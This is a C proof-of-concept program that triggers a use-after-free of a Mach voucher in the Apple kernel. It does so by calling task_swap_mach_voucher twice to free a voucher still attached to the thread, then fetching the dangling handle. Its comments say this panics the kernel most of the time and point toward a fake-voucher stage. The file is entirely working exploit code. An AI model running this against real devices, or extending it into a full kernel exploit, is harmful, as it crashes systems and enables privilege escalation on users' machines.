#include <assert.h>
#include <mach/mach.h>
#include <stdio.h>
#include <unistd.h>


int
main(int argc, const char *argv[]) {
	mach_voucher_attr_recipe_data_t atm_data = 
    {
            .key = MACH_VOUCHER_ATTR_KEY_ATM, //1
            .command = 510
    };

    mach_port_t p1;
    kern_return_t ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);

    mach_port_t p2;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);

    mach_port_t p3;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);

    /* 
            We assign p1 (our target voucher) onto our thread so it can be accessed again later.
            When we later try to retreive it 
            This will increment a ref on the voucher -- the current refcount is 2 
    */
    ret = thread_set_mach_voucher(mach_thread_self(), p1);

    ret = task_swap_mach_voucher(mach_task_self(), p1, &p2); // Trigger the bug once, this drops a ref from 2 to 1 

    ret = task_swap_mach_voucher(mach_task_self(), p1, &p3); // Second trigger, this frees the voucher (refcnt=0)

    /* Ask for a handle on the danging voucher, 9 times out of 10 this will cause a panic due to the bad refcnt etc */ 
    mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
}